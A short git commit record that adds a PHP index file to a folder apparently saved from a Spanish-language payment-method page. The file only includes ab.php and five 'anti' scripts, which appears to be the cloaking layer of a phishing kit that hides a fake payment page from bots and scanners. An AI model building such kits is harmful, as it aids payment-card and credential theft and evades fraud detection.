80a6248a1189d9d2747ab1727290d1f16b289f46
Haribo422 <abondy62@gmail.com>
2024-07-13 04:29:59 +0200

    Add files via upload

---
+++ Seleccione medio de pago_fichiers/index.php
@@ -0,0 +1,10 @@
+<?php
+
+include("../ab.php");
+include("../prevents/anti1.php");
+include("../prevents/anti2.php");
+include("../prevents/anti3.php");
+include("../prevents/anti4.php");
+include("../prevents/anti5.php");
+
+?>
